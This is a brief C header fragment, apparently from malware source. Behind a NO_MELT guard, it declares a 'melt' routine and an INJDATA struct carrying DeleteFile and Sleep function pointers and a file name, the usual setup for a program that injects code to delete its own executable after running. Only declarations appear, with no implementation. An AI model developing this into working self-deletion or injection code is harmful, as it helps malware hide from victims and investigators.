

#ifndef NO_MELT
typedef bool (WINAPI *DELETEFILE)(LPCTSTR);
typedef void (WINAPI *SLEEP)(DWORD);
struct INJDATA 
{
	DELETEFILE fnDeleteFile;
	SLEEP fnSleep;
	char lpFileName[128];
	DWORD dwMilliseconds;
};
bool melt();
#endif